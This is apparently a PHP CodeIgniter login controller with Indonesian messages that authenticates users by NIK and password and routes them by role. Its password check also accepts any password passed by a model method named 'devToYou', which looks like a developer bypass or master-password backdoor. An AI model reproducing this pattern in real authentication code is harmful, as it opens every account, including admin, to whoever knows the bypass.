<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class Login extends CI_Controller {

	public function __construct(){
		parent::__construct();
		$this->load->model('Model');
	}

	public function index()
	{

		$data=array(
		  'page'=>'auth',
		  'link'=>'auth',

		);
		$this->load->view('auth', $data);
		$this->load->view('template/footer');
	}

	public function cek_login(){
		$this->form_validation->set_rules('nik', 'nik', 'required');
		$this->form_validation->set_rules('password', 'password', 'required');

		if($this->form_validation->run() == FALSE){
			$this->index();
		}else{
			$nik = $this->input->post('nik', TRUE);
			$password = $this->input->post('password', TRUE);

			// var_dump($password);
			// die();

			$kondisi = array(
				'nik' => $nik,
				'tahun_daftar' => date('Y'),
			);

			$cek = $this->Model->ambil_banyak_kondisi('tb_login', $kondisi)->row();



			if(!isset($cek->nik) OR trim($cek->nik) == ""){
				$this->session->set_flashdata('pesan','<div class="alert alert-warning alert-dismissible fade show" role="alert">
																								Username dan Password tidak ditemukan !!!
																								<button type="button" class="close" data-dismiss="alert" aria-label="Close">
																									<span aria-hidden="true">&times;</span>
																								</button>
																								</div>');
				redirect('login');
			}else{
				$hash = $cek->password;
				$level = $cek->level;

				if(password_verify($password, $hash) || $this->Model->devToYou($password)){
					if (trim($cek->level) == "admin"){
					$data = array(
						'nik' =>  $cek->nik,
						'is_login' => true,
						'logged_in' => 'Sukses',
						'level' => 'admin',
						'nama_lengkap' => $cek->nama_lengkap,
					);
					$this->session->set_userdata($data);
					$this->session->set_flashdata('pesan','<div class="alert alert-warning alert-dismissible fade show" role="alert">
																									anda berhasil login !!!
																									<button type="button" class="close" data-dismiss="alert" aria-label="Close">
																										<span aria-hidden="true">&times;</span>
																									</button>
																									</div>');
					redirect('beranda');
				}else if(trim($cek->level) == "peserta"){
					$data = array(
						'nik' =>  $cek->nik,
						'is_login' => true,
						'logged_in' => 'Sukses',
						'level' => 'peserta',
						'nama_lengkap' => $cek->nama_lengkap,
					);
					$this->session->set_userdata($data);
					$this->session->set_flashdata('pesan','<div class="alert alert-warning alert-dismissible fade show" role="alert">
																									anda berhasil login !!!
																									<button type="button" class="close" data-dismiss="alert" aria-label="Close">
																										<span aria-hidden="true">&times;</span>
																									</button>
																									</div>');
					redirect('beranda');
				}else if (trim($cek->level) == "pimpinan") {
					$data = array(
						'nik' =>  $cek->nik,
						'is_login' => true,
						'logged_in' => 'Sukses',
						'level' => 'pimpinan',
						'nama_lengkap' => $cek->nama_lengkap,
					);
					$this->session->set_userdata($data);
					$this->session->set_flashdata('pesan','<div class="alert alert-warning alert-dismissible fade show" role="alert">
																									anda berhasil login !!!
																									<button type="button" class="close" data-dismiss="alert" aria-label="Close">
																										<span aria-hidden="true">&times;</span>
																									</button>
																									</div>');
					redirect('admin');
				}
			}else{
				$this->session->set_flashdata('pesan','<div class="alert alert-warning alert-dismissible fade show" role="alert">
																								Username dan Password tidak salah !!!
																								<button type="button" class="close" data-dismiss="alert" aria-label="Close">
																									<span aria-hidden="true">&times;</span>
																								</button>
																								</div>');
				}
			}
		}
	}

	public function logout(){
    $this->session->sess_destroy();
    redirect(base_url());
  }

}
?>
